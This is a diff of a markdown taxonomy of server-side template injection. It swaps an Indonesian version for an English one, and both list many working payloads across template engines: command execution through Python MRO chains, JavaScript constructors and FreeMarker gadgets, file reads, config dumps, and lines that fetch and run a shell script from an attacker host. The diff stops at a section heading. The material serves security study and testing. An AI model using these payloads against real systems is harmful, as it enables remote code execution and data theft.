@@ -1,503 +1,630 @@
----
-title: Server Side Template Injection
-description: 
+# Server-Side Template Injection (SSTI) Mutation Taxonomy
+
+> **Scope**: All structural mutation types that cause user-supplied data to be evaluated as template code by a server-side rendering engine, leading to information disclosure, sandbox escape, or remote code execution. Out of scope: client-side template injection (AngularJS, Vue.js DOM-side), pure XSS without server-side evaluation, and LLM prompt injection (referenced in §12 as an emerging analogue but structurally distinct).
+>
+> **Target size**: 12 top-level categories, ~65 subtypes.
 
 ---
 
-# Taxonomi Mutasi/Variasi Server-Side Template Injection (SSTI)
+## Classification Structure
 
-> **Scope**: Semua template engine **tidak termasuk** EL (Expression Language), OGNL, dan SpEL (Spring Expression Language).
-> Mencakup: Jinja2, Twig, FreeMarker, Velocity, Pebble, Thymeleaf, Smarty, Mako, Tornado, ERB, Slim, Razor, Blade, EJS, Handlebars, Nunjucks, Pug, Dust, Go text/template, dan lainnya di seluruh 8 bahasa pemrograman.
+This taxonomy organizes SSTI mutations along three axes. **Axis 1 (Injection Surface)** is the primary axis: it defines where user input enters the template pipeline and what structural component is being mutated. **Axis 2 (Bypass Mechanism)** is cross-cutting: it describes the specific technique used to circumvent input validation, sandboxing, or rendering restrictions. **Axis 3 (Exploitation Scenario)** is the scenario axis: it maps each category to the real-world architectural deployment that makes the mutation exploitable.
 
----
+The root cause of every SSTI variant is a single architectural failure: the application passes untrusted data as *template source code* rather than as *template parameters*. This conflation of data and code is structurally analogous to SQL injection — and like SQLi, the mutations below are engineering responses to the infinite ways developers re-create this conflation across different engines, contexts, and defensive layers.
 
-## Struktur Klasifikasi
+The following table summarizes the cross-cutting bypass mechanisms (Axis 2) that apply across all §categories:
 
-Taxonomi ini mengorganisir permukaan serangan SSTI sepanjang tiga sumbu ortogonal:
-
-**Sumbu 1 — Exploitation Mechanism** (Sumbu utama, menyusun dokumen): Teknik fundamental di mana attacker meng-escalate dari template syntax injection ke code execution. Sumbu ini menjawab *bagaimana* design template engine atau host language dimanfaatkan untuk mengeksekusi arbitrary code. Kategori berkisar dari direct host-language execution hingga complex multi-step chain yang melibatkan object introspection, sandbox escape, dan compilation-phase pollution.
-
-**Sumbu 2 — Filter/Restriction Bypass Technique** (Sumbu lintas): Metode evasion yang digunakan untuk mengelak character filter, WAF rule, sandbox policy, atau defense berbasis denylist. Teknik-teknik ini berlaku di multiple kategori Sumbu 1 dan merupakan pembeda utama antara payload "yang diketahui" dan "yang novel". Single exploitation mechanism dapat di-deliver melalui puluhan different bypass variation.
-
-**Sumbu 3 — Deployment Context** (Sumbu pemetaan): Lingkungan arsitektural di mana template engine beroperasi — unsandboxed, sandboxed, framework-integrated, atau client-side — yang menentukan required exploitation chain depth dan available attack surface.
-
-### Ringkasan Sumbu 2: Tipe Filter/Restriction Bypass
-
-| Tipe Bypass | Mekanisme | Engine yang Berlaku |
-|---|---|---|---|
-| **Character Encoding** | Hex (`\x5f`), Unicode, URL-encoding dari karakter yang dibatasi | Jinja2, FreeMarker, Twig |
-| **Alternative Accessor** | `|attr()`, bracket notation, `getlist()`, `|first` | Jinja2, Twig |
-| **String Construction** | `|join`, `~` concatenation, `chr()`, `?lower_abc` | Jinja2, Twig, Smarty, FreeMarker |
-| **Parameter Smuggling** | `request.args`, `request.headers`, `request.cookies` | Jinja2 (Flask) |
-| **Format String Injection** | `%c`, `format()`, string formatting dari external input | Jinja2, Python engine |
-| **Reflection & Indirect Access** | `MethodUtils`, `forName()`, field `TYPE` | Thymeleaf, Pebble, FreeMarker |
-| **Template Block Abuse** | `{% with %}`, `{%block%}`, `{%set%}` untuk merestrukturisasi evaluation | Jinja2, Twig |
-| **Base64/Nested Encoding** | Multi-layer encoding untuk menghindari detection berbasis signature | Cross-engine (WAF bypass) |
-
-### Ringkasan Sumbu 3: Tipe Deployment Context
-
-| Context | Karakteristik | Chain Depth | Contoh |
-|---|---|---|---|
-| **Unsandboxed** | Tidak ada pembatasan pada code execution | 1 step | ERB, Mako, Blade, Razor, Smarty `{php}` |
-| **Sandboxed** | Denylist/allowlist pada class, method, atau built-in | 2–4 steps | Jinja2 sandbox, FreeMarker `ALLOWS_NOTHING_RESOLVER`, Twig sandbox |
-| **Framework-Integrated** | Engine berjalan dalam web framework yang mengekspos context object | Variabel | Flask+Jinja2, Spring+Thymeleaf, Express+EJS |
-| **Client-Side (CSTI)** | Template diproses dalam browser; mengarah ke XSS, bukan RCE | 1–2 steps | AngularJS, Vue.js client-side rendering |
+| Bypass Type | Description |
+|-------------|-------------|
+| **Rendering bypass** | Input reaches the engine's evaluation phase without sanitization |
+| **Filter evasion** | Blacklist/whitelist circumvention via encoding, alternate accessors, or alternative syntax |
+| **Sandbox escape** | Navigation of object graphs to reach privileged system classes despite restricted environments |
+| **Context break-out** | Escaping from a code/expression context into a full template context |
+| **Double evaluation** | Exploiting two-pass rendering where output of one render is fed as input to another |
+| **Out-of-band extraction** | Exfiltrating results through DNS, HTTP, or timing when direct reflection is absent |
 
 ---
 
-## §1. Direct Host-Language Execution
+## §1. Expression Syntax Injection (Plain-Text Context)
 
-Template engine yang mengizinkan direct embedding dari host-language code dalam template delimiter menyediakan path paling sederhana ke code execution. Tidak ada object traversal atau sandbox escape yang diperlukan — template syntax itu sendiri mencakup construct yang mengevaluasi arbitrary code dalam runtime server.
+The most direct form: user input is concatenated into a template string in a position where the engine treats all text as potential expressions. The engine's own delimiter syntax (`{{ }}`, `${ }`, `<%= %>`, etc.) is used as-is. This is the foundational attack class from which all others extend.
 
-### §1-1. Inline Code Block Execution
+### §1-1. Direct Expression Evaluation
 
-Engine-engine ini menyediakan delimiter eksplisit untuk embedding dan mengeksekusi raw code dalam template.
+User-supplied data is concatenated into a render call without any positional constraint — the entire string is evaluated as a new template.
 
-| Subtype | Engine (Bahasa) | Mekanisme | Contoh Payload |
-|---|---|---|---|
-| **Ruby code blocks** | ERB (Ruby) | Delimiter `<%= %>` dan `<% %>` mengeksekusi arbitrary Ruby | `<%= system('id') %>` |
-| **Ruby Slim blocks** | Slim (Ruby) | Prefix `- ` untuk Ruby code, `= ` untuk output | `= system('id')` |
-| **PHP code blocks** | Smarty < 3 (PHP) | Tag `{php}...{/php}` mengeksekusi PHP secara langsung | `{php}echo system('id');{/php}` |
-| **PHP Blade directives** | Blade (PHP/Laravel) | Directive pair `@php...@endphp` | `@php echo system('id'); @endphp` |
-| **C# Razor blocks** | Razor (.NET) | Sintaks `@{ }` dan `@expression` mengeksekusi C# code | `@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }` |
-| **Python embedded blocks** | Mako (Python) | Block `<% %>` mengeksekusi Python secara langsung | `<% import os; os.system('id') %>` |
-| **Python expression tags** | Mako (Python) | `${expression}` mengevaluasi Python expression | `${__import__('os').popen('id').read()}` |
-| **Perl code blocks** | Mojolicious (Perl) | `<%= %>` dan `<% %>` mengeksekusi Perl code | ``<%= `id` %>`` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Math-probe evaluation** | `{{7*7}}` renders as `49`, confirming execution | Application reflects input through `render_template_string()` or equivalent |
+| **Engine fingerprinting** | `{{7*'7'}}` yields `49` (Jinja2) or `7777777` (Twig), disambiguating engines | Multiple candidate engines active; probe responses differ |
+| **Polyglot triggering** | `${{<%[%'"}}%\` causes parse errors in whichever engine is present | Unknown engine; any error response confirms SSTI |
+| **Object/context dump** | `{{ self }}`, `{{ config }}`, `{{ . }}` (Go) reveal template context objects | Framework injects privileged objects into render scope |
 
-Inline code block execution adalah primitive SSTI paling straightforward. Jika template engine mendukungnya dan tidak ada sandbox yang diterapkan, payload attacker dibatasi hanya oleh kemampuan host language runtime. Defense utama adalah untuk tidak pernah mengizinkan input untrusted memasuki template source code.
+**Example** (Jinja2/Flask):
+```
+GET /profile?name={{config.SECRET_KEY}} HTTP/1.1
+→ Response: Hello s3cr3t_k3y_v4lu3!
+```
 
-### §1-2. Module/Import Directive Execution
+### §1-2. String Concatenation Injection
 
-Beberapa engine mengizinkan importing module atau package dalam template code, mengaktifkan akses ke system-level function bahkan ketika direct code execution delimiter tampak dibatasi.
+The application constructs a template string via string concatenation, not a safe parameter call. Variants include f-strings, format strings, and `+` concatenation.
 
-| Subtype | Engine (Bahasa) | Mekanisme | Contoh Payload |
-|---|---|---|---|
-| **Python import in template** | Tornado (Python) | `{% import module %}` dalam template block | `{% import os %}{{ os.popen('id').read() }}` |
-| **Mako module import** | Mako (Python) | `<%! %>` untuk module-level block, `<% %>` untuk in-line | `<% import subprocess; x=subprocess.check_output('id',shell=True) %>${x}` |
-| **Jinja2 namespace import** | Jinja2 (Python) | Ketika extension seperti `jinja2.ext.do` di-load | `{% set x = cycler.__init__.__globals__.os.popen('id').read() %}` |
-
-### §1-3. File Operation Primitive
-
-Beberapa engine menyediakan direct file I/O function dalam template syntax, mengaktifkan arbitrary file read/write tanpa full code execution.
-
-| Subtype | Engine (Bahasa) | Mekanisme | Contoh Payload |
-|---|---|---|---|
-| **Smarty file write** | Smarty (PHP) | Static method `Smarty_Internal_Write_File::writeFile()` | Menulis PHP webshell ke webroot |
-| **ERB file read** | ERB (Ruby) | `File.read()` Ruby dalam `<%= %>` | `<%= File.read('/etc/passwd') %>` |
-| **Go method-based file read** | Go text/template | Memanggil exported method pada struct yang di-pass | `{{ .GetFile "/etc/passwd" }}` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Python f-string template** | `f"Hello {user_input}"` → if engine processes it: `Hello {{7*7}}` | Application uses Python f-strings as template source |
+| **String format() injection** | `"Hello {}".format(user_input)` passed to render | Format string output fed directly to template engine |
+| **Implicit concatenation** | Template built with `+` operator from user parts | No sanitization between string join and render call |
 
 ---
 
-## §2. Object Introspection & Class Hierarchy Traversal
+## §2. Code-Context Injection (Variable Context Break-Out)
 
-Ketika direct code execution tidak tersedia, attacker mengeksploitasi object model host language untuk berjalan inheritance hierarchy, menemukan loaded class, dan mencapai dangerous method. Ini adalah kategori exploitation SSTI paling umum dan serbaguna, mencakup 16 dari 34 template engine yang dipelajari.
+In a code context, user input is already embedded inside a template expression (e.g., `greeting=Hello {{username}}`). The mutation goal is to break out of the variable slot and inject new template directives.
 
-### §2-1. Python MRO (Method Resolution Order) Chain
+### §2-1. Statement Termination and Re-Entry
 
-Kemampuan introspection Python yang kaya menjadikannya ground paling subur untuk serangan object-hierarchy SSTI. Teknik fundamental menggunakan `__mro__` atau `mro()` untuk naik inheritance tree ke `object`, kemudian `__subclasses__()` untuk turun dan enumerate semua class yang di-load dalam current Python process.
+The attacker closes the existing template expression with `}}` and appends new directives after it.
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **Basic MRO traversal** | `''.__class__.__mro__[1].__subclasses__()` enumerate semua loaded class | Python object apa pun dalam template context | `{{ ''.__class__.__mro__[1].__subclasses__() }}` |
-| **Popen discovery** | Iterate subclass untuk menemukan `subprocess.Popen` pada index spesifik | Module `subprocess` di-load | `{{ ''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate() }}` |
-| **FileIO discovery** | Temukan subclass `_io.FileIO` atau `_io._RawIOBase` untuk file read | Module `_io` di-load | `{{ ''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read() }}` |
-| **Config object traversal** | Akses `__init__.__globals__` dari object Flask `config` untuk module `os` | Flask application context | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
-| **Cycler/Joiner globals** | Gunakan `__init__.__globals__` dari object Jinja2 built-in untuk mencapai `os` | Object Jinja2 built-in tersedia | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
-| **Lipsum globals** | Abuse chain globals dari function Jinja2 `lipsum` | `lipsum` tersedia dalam context | `{{ lipsum.__globals__['os'].popen('id').read() }}` |
-| **Namespace traversal** | Gunakan `namespace.__init__.__globals__` | Object Jinja2 namespace tersedia | `{{ namespace.__init__.__globals__.os.popen('id').read() }}` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Closing-brace escape** | `username}}<h1>injected</h1>{{` closes the variable slot | Engine re-evaluates the rest of the string |
+| **Statement suffix injection** | `username}}{{7*7}}{{` inserts a calculation mid-template | Application doesn't strip `}}` from parameters |
+| **Directive injection after close** | `username}}{%import os%}{{os.popen('id').read()}}{{` | Logic-enabled template engine (Jinja2 with `{% %}`) |
 
-Insight kunci adalah bahwa **Python object apa pun** yang reachable dari template context dapat berfungsi sebagai starting point untuk MRO traversal. Tantangan attacker adalah menemukan index yang benar dalam `__subclasses__()` untuk target class, yang bervariasi antar aplikasi dan versi Python. Automated tool menyelesaikan ini dengan mengiterasi semua subclass.
+**Example** (Jinja2 code context):
+```
+GET /greet?username=admin}}{{config.items()}}{{
+→ Returns Flask config dict alongside greeting
+```
 
-### §2-2. JavaScript Constructor Chain
+### §2-2. Double-Evaluation Exploitation
 
-Dalam JavaScript template engine (Node.js), eksploitasi mencerminkan MRO Python tetapi menggunakan prototype chain dan properti `constructor`. Karena `constructor` dari setiap function menunjuk ke `Function`, attacker dapat membuat arbitrary function dari string body.
+Some frameworks perform a first pass (preprocessing) that resolves expressions, then feed the result to a second rendering pass. If user input survives the first pass as a literal, it gets evaluated in the second.
 
-| Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|---|
-| **Range constructor** | Nunjucks | `range.constructor` adalah `Function`, mengizinkan code eval dari string | `{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
-| **Cycler constructor** | Nunjucks | Alternatif untuk range; akses `Function` constructor yang sama | `{{ cycler.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
-| **String constructor chain** | Handlebars, Pug, EJS, JsRender | `''.constructor.constructor` menghasilkan `Function` | `${ ''.toString.constructor.call({},"return global.process.mainModule.require('child_process').execSync('id')")() }` |
-| **Nested helper abuse** | Handlebars | Chain helper `#with`, `split`, `push`, `pop` untuk membangun code execution | `{{#with "s" as \|string\|}}{{#with "e"}}{{#with split as \|conslist\|}}...{{/with}}{{/with}}{{/with}}` |
-| **Template7 js helper** | Template7 | Helper built-in `js` mengevaluasi JavaScript | `{{js "global.process.mainModule.require('child_process').execSync('id')"}}` |
-| **Marko out expression** | Marko | `${expression}` mengevaluasi arbitrary JS | `${require('child_process').execSync('id')}` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Thymeleaf expression preprocessing** | `__${7*7}__` — the double-underscore delimiters trigger preprocessing before the main render | Thymeleaf used with `${...}` inline expressions; user input reflected in a template attribute |
+| **Velocity double-tag injection** | Input is assigned to a Velocity variable then re-used in a second template call | Application uses `$variable` where variable content is itself user-controlled |
+| **OGNL-via-Struts double evaluation** | A Struts 2 action result calls a second FreeMarker or Velocity template, making OGNL results available as template variables | Multi-layer rendering pipeline (OGNL → FreeMarker) |
+| **Spring Boot Referer/header reflection** | HTTP Referer header value reflected into a Thymeleaf template with `__${...}__` preprocessing wrapping | Framework automatically places HTTP headers into template context without sanitization |
 
-### §2-3. Java Reflection Chain
-
-Java template engine dieksploitasi melalui reflection — mengakses `getClass()`, kemudian `forName()` untuk mencapai `java.lang.Runtime` atau `java.lang.ProcessBuilder` untuk command execution.
-
-| Subtype | Engine | Mekanisme | Contoh |
-|---|---|---|---|
-| **Direct getClass chain** | Pebble (< 3.0.9) | Traversal `variable.getClass().forName(...)` | `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}` |
-| **TYPE field bypass** | Pebble (>= 3.0.9) | Field wrapper Java `TYPE` (`(1).TYPE`) menyediakan `Class` tanpa `getClass()` | Via `java.lang.Integer.TYPE` → akses `Class` |
-| **Velocity ClassTool** | Velocity | `$class.inspect()` dan `$class.type` memperoleh arbitrary class reference | `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")` |
-| **Jinjava reflection** | Jinjava | Python-like introspection yang diadaptasi ke object model Java | Introspective chain mirip Python |
-| **Spring bean access** | Pebble + Spring | Exposed Spring bean menyediakan object graph yang mengarah ke unrestricted API | Bean traversal → ClassLoader → arbitrary class instantiation |
+**Real-world context**: Unauthenticated SSTI in a Spring Boot 3.3.4 application was achieved via Referer header reflection using Thymeleaf's preprocessing feature, allowing `${T(java.lang.Runtime).getRuntime().exec("id")}` to yield RCE with no special encoding.
 
 ---
 
-## §3. Dangerous Built-in Functions & Type Constructors
+## §3. Python Object Graph Traversal (MRO Chain Exploitation)
 
-Banyak template engine menyediakan built-in function atau type-creation mechanism yang dirancang untuk operasi template yang legitimate tetapi dapat di-weaponize untuk code execution.
+Specific to Python template engines (Jinja2, Mako, Tornado). The Python runtime exposes every loaded class through the Method Resolution Order (MRO) and `__subclasses__()` APIs. From any object reachable in the template context, an attacker can navigate to privileged classes like `subprocess.Popen` or file I/O handlers.
 
-### §3-1. FreeMarker Built-in Exploitation
+### §3-1. MRO Root Navigation
 
-FreeMarker menyediakan beberapa built-in function yang mengaktifkan code execution ketika tidak properly restricted.
+Starting from any class-bearing object in context, traverse to `object` (the Python base class) via `__mro__` or `__base__`, then enumerate all loaded subclasses.
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **`?new` instantiation** | Membuat instance dari implementasi `TemplateModel`, termasuk `freemarker.template.utility.Execute` | `TemplateClassResolver` tidak diatur ke `ALLOWS_NOTHING_RESOLVER` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
-| **`?api` Java API access** | Mengekspos underlying Java API dari BeanWrappers, mengaktifkan reflection | `setAPIBuiltinEnabled(true)` dalam konfigurasi | Akses ke `java.lang.Class`, `ClassLoader`, dan arbitrary method invocation |
-| **`?lower_abc` / `?upper_abc` character encoding** | Mengkonversi angka ke karakter alphabet, mengaktifkan filter bypass | FreeMarker expression context | `6?lower_abc` → `"f"`, mengaktifkan character-by-character payload construction |
-| **`ObjectConstructor` instantiation** | Direct object creation via built-in `ObjectConstructor` | `UNRESTRICTED_RESOLVER` atau `SAFER_RESOLVER` tidak memblokirnya | `<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}` |
-| **`JythonRuntime` execution** | Mengeksekusi kode Jython (Python-on-JVM) dalam FreeMarker | Jython tersedia di classpath, resolver tidak memblokir | `<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os; os.system("id")</@jr>` |
-| **`assign` + `include` chain** | Assign data model variables kemudian include attacker-controlled resource | Template directive injection | `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl attacker.com/shell.sh \| bash")}` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`__mro__` walk** | `''.__class__.__mro__[1].__subclasses__()` — accesses `object` via MRO list | Any Python object reachable in render context |
+| **`__base__` shortcut** | `''.__class__.__base__.__subclasses__()` — single-step equivalent | Engine allows `__base__` attribute access |
+| **Index-based class selection** | Target class (e.g., `subprocess.Popen`) found at index `N` in subclasses list | Requires environment probing; index varies across deployments |
+| **Name-filtered class selection** | Loop: `{% for x in subclasses %}{% if 'warning' in x.__name__ %}` — avoids hardcoded index | Engine allows loop + conditionals (Jinja2 `{% %}` blocks) |
 
-### §3-2. Twig Built-in Exploitation
+**Example** (Jinja2 — index-free variant):
+```jinja
+{% for x in ().__class__.__base__.__subclasses__() %}
+  {% if "warning" in x.__name__ %}
+    {{ x()._module.__builtins__['__import__']('os').popen("id").read() }}
+  {% endif %}
+{% endfor %}
+```
 
-Twig (PHP) menyediakan environment default yang lebih restricted, tetapi beberapa built-in feature dapat di-chain untuk code execution.
+### §3-2. Globals and Builtins Extraction
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **`_self` environment access** | `_self.env` mengakses object Twig Environment, mengaktifkan method call | Twig < 2.x (deprecated dalam versi later) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
-| **`filter()` callback registration** | Register arbitrary PHP function sebagai Twig filter callback | Akses ke environment object atau `getFilter()` | Register `system` sebagai callback, kemudian panggil via filter |
-| **Block/charset gadget** | Abuse `{%block%}` dan `_charset` built-in untuk command construction | Twig rendering context | `{%block U%}id000passthru{%endblock%}{%set x=block(_charset\|first)\|split(000)%}{{ [x\|first]\|map(x\|last)\|join }}` |
-| **`_context` variable abuse** | `_context` menyediakan akses ke semua template variable; dikombinasikan dengan `slice`, `split`, `map` untuk code construction | Double-rendering atau akses ke `_context` | `{{ id~passthru~_context\|join\|slice(2,2)\|split(000)\|map(_context\|join\|slice(5,8)) }}` |
-| **`sort` / `map` filter with callback** | Array filter Twig menerima callable argument | PHP function accessible | `{{ ['id']\|sort('system') }}` atau `{{ ['id']\|map('system') }}` |
-| **`evaluate_twig()` nested call** | Bypass regex-based sanitization via nested Twig evaluation | Grav CMS atau framework serupa yang mengekspos `evaluate_twig` | Nested calls menghindari validasi `cleanDangerousTwig` |
+Certain Flask/Jinja2 context objects expose `__globals__` and `__builtins__` without needing full MRO traversal.
 
-### §3-3. Smarty Built-in Exploitation
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`request.application.__globals__`** | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` | Flask `request` object in template context |
+| **`get_flashed_messages.__globals__`** | Accesses Flask's flash message function to reach `__globals__` | Flask function reference reachable in Jinja2 |
+| **`config.__class__` pivot** | `config.__class__.__mro__[-1].__subclasses__()` — pivots via config object class | Flask config object always in Jinja2 context |
+| **`self.__init__.__globals__`** | Twig PHP: `_self.env.enableDebug()` or `getattr` chain to underlying PHP | Twig with debug mode or `_self` context exposed |
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **`{if}` tag code execution** | `{if}` Smarty mengevaluasi PHP expression | Smarty security policy tidak membatasi `{if}` | `{if system('id')}{/if}` |
-| **Static class access** | `Smarty_Internal_Write_File` dan static class lainnya accessible | Static class tidak dibatasi | File write untuk membuat webshell |
-| **`chr()` + `cat` construction** | `chr()` menghasilkan karakter, modifier `cat` menggabungkan | Akses Smarty function | `{chr(105)\|cat:chr(100)}` → `"id"` → pass ke `passthru()` |
-| **`{fetch}` URL access** | Fetch remote content via built-in function `{fetch}` | `{fetch}` tidak dinonaktifkan dalam security policy | `{fetch file="http://attacker.com/shell.txt"}` |
+### §3-3. File Descriptor and Config Object Exploitation
 
-### §3-4. Go Template Method Invocation
+Direct exploitation of objects already in context without full class traversal.
 
-Go template engine menyajikan model eksploitasi yang unik: tidak ada intrinsic dangerous function, tetapi **exported method** apa pun pada object yang di-pass ke template dapat dipanggil.
-
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **Exposed method call** | Panggil public method pada struct yang di-pass ke `Execute()` | Target struct memiliki method dengan dangerous side effects | `{{ .ExecuteCmd "id" }}` atau `{{ .GetFile "/etc/passwd" }}` |
-| **Method confusion** | Eksploitasi method name collision atau unexpected method accessibility dalam deep object graph | Complex struct hierarchies di-pass ke template | Enumerate accessible method via `{{ . }}` |
-| **`call` built-in (text/template)** | Function `call` dari `text/template` meng-invoke function value apa pun | Field function-type dalam template data | `{{ call .DangerousFunc "arg" }}` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`config.from_pyfile()` abuse** | Write malicious Python to `/tmp/`, then load via `config.from_pyfile()` | File write capability exists from prior subclass abuse |
+| **`config['SECRET_KEY']` disclosure** | `{{config}}` or `{{config.items()}}` dumps all Flask config values | Config object in Jinja2 context (default Flask) |
+| **Environment variable enumeration** | `{{self.__dict__}}` when `config` is blocked; enumerates app state | `self` object reflected in template scope |
 
 ---
 
-## §4. Sandbox Escape Techniques
+## §4. Java Object Graph Exploitation
 
-Ketika template engine mengimplementasikan security sandbox, attacker harus menemukan indirect path ke code execution. Sandbox escape merepresentasikan serangan SSTI paling technically sophisticated dan seringkali engine- atau application-specific.
+Java template engines (FreeMarker, Velocity, Thymeleaf, Pebble, Jinjava) expose the Java reflection API. From any accessible class, `Class.forName()` or `getClass()` chains allow construction of arbitrary objects.
 
-### §4-1. FreeMarker Sandbox Bypass
+### §4-1. FreeMarker Built-in Exploitation
 
-Sandbox FreeMarker dikontrol oleh konfigurasi `TemplateClassResolver`. Bahkan dengan `ALLOWS_NOTHING_RESOLVER`, beberapa jalur bypass ada.
+FreeMarker's `?new()` built-in instantiates any class by name from its standard library, making `freemarker.template.utility.Execute` the canonical RCE gadget.
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **`?api` + ClassLoader chain** | Built-in `?api` mengakses Java API; `getProtectionDomain().getClassLoader()` memperoleh ClassLoader | `setAPIBuiltinEnabled(true)` dan FreeMarker < 2.3.30 | ClassLoader → load arbitrary class → instantiate `Execute` |
-| **`getResourceAsStream` file read** | `getResourceAsStream()` dari ClassLoader membaca classpath dan filesystem resource | ClassLoader accessible via `?api` | Read via scheme URI `file://`, `http://`, `ftp://` (SSRF) |
-| **Application utility class abuse** | Manfaatkan application-specific class yang diekspos ke template (misalnya, `GroovyUtil.eval()` dari OFBiz) | Aplikasi mengekspos utility class via hash `Static` | `${Static["org.apache.ofbiz.base.util.GroovyUtil"].eval("['id'].execute().text")}` (CVE-2024-48962) |
-| **Gson deserialization gadget** | Gunakan `fromJson()` dari Gson untuk deserialize `freemarker.template.utility.Execute` dari JSON | Gson di classpath, ClassLoader accessible | Load Gson → `fromJson()` → instantiate `Execute` → RCE |
-| **Version-specific bypasses** | FreeMarker < 2.3.30: `ProtectionDomain.getClassLoader` unrestricted | Versi FreeMarker spesifik | Direct ClassLoader access tanpa `?api` |
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`Execute?new()` direct** | `${"freemarker.template.utility.Execute"?new()("id")}` | FreeMarker engine without class whitelist restriction |
+| **`lower_abc` string builder** | Converts integers to alphabetic chars (`1`→`a`, `2`→`b`) to build strings without using quote characters | Quote-filtering applied; FreeMarker's `lower_abc` function bypasses it |
+| **ClassLoader chain** | `<#assign classloader=article.class.protectionDomain.classLoader>` → load `Execute` class dynamically | Complex sandbox; direct `?new()` blocked but ClassLoader accessible |
+| **`getProtectionDomain()` file read** | `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/path/to/file').toURL().openStream().readAllBytes()?join(" ")}` | Arbitrary file read without code execution; byte array rendered as space-separated integers |
 
-### §4-2. Twig Sandbox Bypass
+**CVE reference**: CVE-2025-26865 — FreeMarker SSTI in Apache OFBiz `ecommerce` plugin allowing unauthenticated RCE.
 
-Sandbox Twig membatasi allowed tag, filter, method, dan property melalui `SecurityPolicy`. Bypass menargetkan gap antara policy enforcement dan object yang accessible dalam template context.
+### §4-2. Apache Velocity Exploitation
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **Runtime configuration modification** | Modifikasi `system.twig.safe_functions` / `safe_filters` via `grav.twig.twig_vars['config']` untuk whitelist dangerous function | Grav CMS dengan editor access (CVE-2024-28116) | Step 1: tambahkan `system` ke safe_functions. Step 2: `{{ system('id') }}` |
-| **`_self.env` method calls** | Akses method Twig Environment via referensi `_self` | Twig 1.x (deprecated dalam 2.x) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
-| **Regex sanitization bypass** | Nested call `evaluate_twig()` melewati weak regex-based `cleanDangerousTwig` | Grav CMS (CVE-2025-66294) | Nested Twig directive menghindari single-pass regex |
-| **Extension class access** | Akses class Twig extension untuk redefine config variable | Template memiliki akses ke object extension | Redefine variable untuk mengaktifkan dangerous function |
+Velocity lacks `?new()` but allows variable assignment (`#set`) and Java type inspection via `$class`.
 
-### §4-3. Thymeleaf Sandbox Bypass
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`Class.forName()` chain** | `#set($rt=$x.class.forName('java.lang.Runtime'))` followed by `$rt.getRuntime().exec('cmd')` | Velocity without ClassTool restriction; `$class` or `$x.class` accessible |
+| **`#set` variable multi-step** | Build `Runtime`, `Character`, `String` objects via multiple `#set` assignments to reconstruct exec arguments | ClassTool plugin disabled; must build objects from primitives |
+| **Stream-to-string output** | `$ex.waitFor()` with `#foreach($i in [1..$out.available()])` to read command output character by character | No direct string return from exec; must iterate input stream |
+| **Base64 payload decode** | Velocity executes `bash -c` with a base64-decoded string to bypass command-level filters | Network filtering blocks direct shell keywords; base64 wrapping evades detection |
 
-Thymeleaf mengimplementasikan defense modern termasuk pembatasan package berbasis denylist (`java.`, `javax.`, `org.springframework.util.`), instantiation blocking, dan pencegahan static class access.
+**CVE reference**: CVE-2024-28254 — Multi-step base64-decoded Java payload executed via Velocity in a commercial product.
 
-| Subtype | Mekanisme | Kondisi Kunci | Contoh |
-|---|---|---|---|
-| **Preprocessing double evaluation** | Preprocessing `__${expr}__` mengevaluasi content antara double underscore sebelum main expression | Input pengguna direfleksikan dalam preprocessing context | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::x` |
-| **Third-party library reflection** | Gunakan `org.apache.commons.lang3.reflect.MethodUtils` (tidak dalam denylist) untuk reflection call | commons-lang3 di classpath (umum dalam Spring Boot) | `MethodUtils.invokeStaticMethod(forName("java.lang.Runtime"), "getRuntime")` → `exec()` |
-| **Spring context variable access** | Akses object Spring request/response melalui context variable untuk exfiltrate output | Spring MVC integration | Output via object response tanpa external connection |
-| **Denylist gaps** | Library third-party dan application-specific class tidak dicakup oleh default denylist | Library tambahan di classpath | Class utility apa pun dengan kemampuan `exec()` atau `invoke()` |
+### §4-3. Spring Expression Language (SpEL) Injection
 
-### §4-4. Pebble Sandbox Bypass
